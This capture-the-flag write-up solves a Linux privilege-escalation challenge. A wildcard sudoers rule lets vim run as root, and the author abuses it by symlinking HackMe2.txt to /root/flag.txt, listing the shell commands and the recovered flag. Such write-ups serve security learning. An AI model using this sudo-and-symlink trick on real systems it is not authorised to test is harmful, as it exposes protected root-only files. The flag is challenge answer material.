# Description

All you need to do is read the flag!

`ssh ctf@138.247.13.103`

# Solution

Wandering around on the server, I remark the file `sudo-1.8.14.tar.gz`. Ok, so `sudo` will probably help us. Let's check `/etc/sudoers`:

`ctf ALL=(root) NOPASSWD: /usr/bin/vim /home/ctf/*/*/HackMe2.txt`

We can read a file name `HackMe2.txt` as root (without password needed) if it's located in `/home/ctf/*/*`. Remember, our objective is to read `/root/flag.txt`. The idea it to create this `HackMe2.txt` at the right place and link it to `/root/flag.txt`. In other word:

```
ctf@d2db6dbd656b:~$ mkdir -p a/b
ctf@d2db6dbd656b:~$ cd a/b
ctf@d2db6dbd656b:~/a/b$ ln -s /root/flag.txt HackMe2.txt
ctf@d2db6dbd656b:~/a/b$ sudo /usr/bin/vim /home/ctf/a/b/HackMe2.txt
```

The flag is `MCA{ohghov1ieli7Eo2}`.
